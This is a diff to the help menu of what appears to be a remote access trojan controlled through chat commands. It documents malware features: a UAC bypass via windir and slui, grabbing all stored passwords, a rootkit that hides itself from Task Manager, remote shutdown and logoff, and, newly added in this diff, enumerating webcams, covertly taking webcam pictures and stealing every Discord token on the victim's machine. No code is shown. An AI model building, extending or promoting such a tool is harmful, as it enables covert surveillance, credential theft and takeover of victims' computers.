@@ -47,7 +47,7 @@ Available commands are :
 --> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
 --> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
---> !uacbypass = attempt to bypass uac to gain admin by using fod helper
+--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
 --> !shutdown = shutdown computer
 --> !restart = restart computer
 --> !logoff = log off current user
@@ -68,6 +68,10 @@ Available commands are :
 --> !password = grab all passwords
 --> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
 --> !unrootkit = Remove the rootkit(Admin rights are required)
+--> !getcams = Grab the cameras names and their respected selection number
+--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
+--> !webcampic = Take a picture out of the selected webcam
+--> !grabtokens = Grab all discord tokens on the current pc
 --> !help = This help menu
 ```
 
